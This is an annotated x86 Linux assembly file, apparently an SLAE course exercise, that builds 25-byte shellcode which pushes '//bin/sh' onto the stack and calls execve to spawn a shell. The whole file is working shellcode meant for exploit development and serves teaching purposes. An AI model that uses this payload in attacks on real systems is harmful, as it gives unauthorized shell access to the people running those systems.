; Filename: shell_direct-stack.nasm
; Author:  Marco Lugo (SLAE-1031)
; Description: spawns a shell
;
; For the SecurityTube Linux Assembly Expert (SLAE) course
; Directly pushing //bin/sh to stack
; The resulting shellcode is 25 bytes

global _start  		

section .text
_start:
	xor eax, eax ; assigns 0x00 to EAX
	push eax ; push 0x00 (null byte) to stack

	push 0x68732f6e ; push n/sh hex encoded and inverted to account for the little-endian CPU architecture
	push 0x69622f2f ; push //bi with the same adjustments as the previous line
	
	mov ebx, esp ; retrieves stack (i.e. null-terminated //bin/sh) and passes it to EBX, which will act as an argument to execve
	
	push eax ; push 0x00 (null byte) to stack
	push ebx ; push EBX to stack
	mov ecx, esp ; retrieves the address of the null-terminated shellpath and assigns it to ECX, an argument for execve
	
	xor edx, edx ; assigns 0x00 to EDX which will also act as an argument for execve

	mov al, 0x0b ; assign 11 to al (eax) as this is the syscall number for execve
	int 0x80 ; syscall